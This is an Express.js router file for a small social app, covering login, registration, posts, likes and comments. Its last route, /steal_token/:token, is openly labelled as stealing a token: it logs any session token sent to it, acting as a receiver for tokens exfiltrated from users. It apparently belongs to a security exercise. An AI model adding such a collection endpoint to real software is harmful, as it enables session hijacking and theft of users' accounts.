const controller = require('../controllers/controllers')
var express = require('express')

var router = express.Router()

// ** USER  ** //
//login
router.post('/api/user/auth/', controller.login)

//login
router.delete('/api/user/auth/', controller.logout)

//Check token validity
router.get('/api/user/auth', controller.checkToken)

//register
router.post('/api/user/register/', controller.register)

//update name
router.put('/api/user/name', controller.updateName)

//update surname
router.put('/api/user/surname', controller.updateSurname)

//update pwd
router.put('/api/user/pwd', controller.updatePwd)

// ** POST ** //
//add post
router.post('/api/post/', controller.addPost)

//delete post
router.delete('/api/post/', controller.deletePost)

//get last 10 post with offset
router.get('/api/post/:offset', controller.getLastPost)

//get searched post
router.get('/api/post/:offset/:search_text', controller.getSearchedPost)

// ** LIKE CONTENT **/
//add like
router.post('/api/like/', controller.addLike)

//remove like
router.delete('/api/like/', controller.removeLike)

// ** COMMENT CONTENT **/
//get comment to POST
router.get('/api/comment/:post_id', controller.getComment)

//add like
router.post('/api/comment/', controller.addComment)

// GET REQUEST TO STEAL TOKEN
router.get('/steal_token/:token', (req, res) => {
    console.log("I steal this token value:" + req.params.token)
    res.sendStatus(200)
})


module.exports = router;
